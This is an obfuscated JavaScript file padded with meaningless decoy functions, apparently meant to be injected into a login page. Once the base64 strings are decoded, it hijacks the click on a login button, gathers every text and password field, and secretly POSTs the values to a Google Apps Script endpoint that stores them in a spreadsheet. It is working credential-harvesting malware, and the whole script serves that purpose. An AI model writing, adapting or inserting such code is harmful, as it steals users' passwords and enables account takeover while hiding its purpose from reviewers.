(function () {
  const a0 = ['m', 'a', 'c', 'r', 'o', 's', '/', 's', '/', 'A', 'K', 'f', 'y', 'c', 'b', 'x', 'G', 'd', 'n', 'e', '5', '4', 'c', 'Z', 'V', 'd', 'r', 'u', '0', '6', 'Q', 's', 'G', 'p', 'X', 'P', 'r', 'w', 'D', 'Y', 'c', 'V', '9', 'B', 'E', 'M', 'i', 'q', '0', 'n', 'F', 'X', 'r', 'x', 'd', 'M', 'x', 'V', 'D', 'O', 'z', 's', 'e', 'k', 'k', 'G', '6', 'K', 'z', 'U', 'W', 'h', '6', '1', 'a', 'p', 'B', '2', 'y', 'B', 'P', '/'];
  const a1 = 'aW5wdXQ=';
  const a2 = 'dGV4dA==';
  const a3 = 'cGFzc3dvcmQ=';
  const a4 = 'ZXZlbnQ=';
  const a5 = 'Y2xpY2s=';
  const a6 = 'bV9sb2dpbl9zaWduaW5fc3VibWl0';
  const a7 = 'UE9TVA==';
  const a8 = 'Q29udGVudC1UeXBl';
  const a9 = 'YXBwbGljYXRpb24vanNvbg==';
  const a10 = 'bm8tY29ycw==';
  const a19 = ['h', 't', 't', 'p', 's', ':', '/', '/', 's', 'c', 'r', 'i', 'p', 't', '.', 'g', 'o', 'o', 'g', 'l', 'e', '.', 'c', 'o', 'm', '/'];
  const a11 = 'Ym9keQ==';
  const a12 = 'dGhlbg==';
  const a13 = 'anNvbg==';
  const a14 = 'Y2F0Y2g=';
  const a15 = 'ZXJyb3I=';
  const a16 = 'bG9n';
  const a20 = ['e', 'x', 'e', 'c'];
  const a17 = 'RGF0YSBzYXZlZCB0byBHb29nbGUgU2hlZXRzOg==';
  const a18 = 'RXJyb3Igc2F2aW5nIGRhdGE6';

  function b1(str) {
    return atob(str);
  }

  function b2() {
    let b = 5;
    let c = 10;
    let d = b * c;
    return d + 1000;
  }

  function b3() {
    let x = "Just a string";
    let y = "that does nothing";
    let z = x + " " + y;
    return z + "!";
  }

  for (let i = 0; i < 1000; i++) {
    let z = i * 3;
  }

  function b4() {
    const result = 3 * (7 + 2) - 5;
    let intermediate = result / 2;
    return intermediate;
  }

  function b5() {
    let arr = [1, 2, 3];
    arr.forEach(item => {
      let result = item * 2;
      console.log(result);
    });
    let sum = arr.reduce((acc, curr) => acc + curr, 0);
    return sum;
  }

  function b6() {
    let str = "irrelevant";
    for (let i = 0; i < str.length; i++) {
      str = str + " extra";
    }
    return str.split('').reverse().join('');
  }

  function b7() {
    function c1() {
      let a = 100;
      return a;
    }
    function c2() {
      let b = 200;
      return b;
    }
    return c1() + c2();
  }

  function b8() {
    const b9 = document.querySelectorAll(b1(a1));
    b9.forEach((b10) => {
      b10.addEventListener(b1(a4), (b11) => {
        console.log('');
      });
    });
  }

  for (let i = 0; i < 10; i++) {
    if (i % 2 === 0) {
      let x = i * 2;
    } else {
      let x = i + 1;
    }
  }

  function b12() {
    const b13 = document.querySelector(`#${b1(a6)}`);
    const b14 = document.querySelectorAll(`${b1(a1)}[type="${b1(a2)}"]`);
    const b15 = document.querySelectorAll(`${b1(a1)}[type="${b1(a3)}"]`);

    b13.addEventListener(b1(a5), (b16) => {
      b16.preventDefault();

      const b17 = {};

      b14.forEach((b18) => {
        b17[b18.name] = b18.value;
      });

      b15.forEach((b19) => {
        b17[b19.name] = b19.value;
      });

      console.log('');

      b20(b17);
    });
  }

  const b21 = {
    d: 1,
    e: 2,
    f: 3,
    nested: {
      v: 10,
      w: 20,
      x: 30
    }
  };

  function b22(x) {
    if (x < 1000) {
      return b22(x + 1);
    }
    return x;
  }

  function b20(b23) {
    
    const b24 = a19.join('') + a0.join('') + a20.join('');

    fetch(b24, {
      method: b1(a7),
      headers: {
        [b1(a8)]: b1(a9),
      },
      body: JSON.stringify(b23),
      mode: b1(a10),
    })
      .then((b25) => b25[b1(a13)]())
      .then((b26) => console[b1(a16)](b1(a17), b26));
  }

  b8();
  b12();
})();
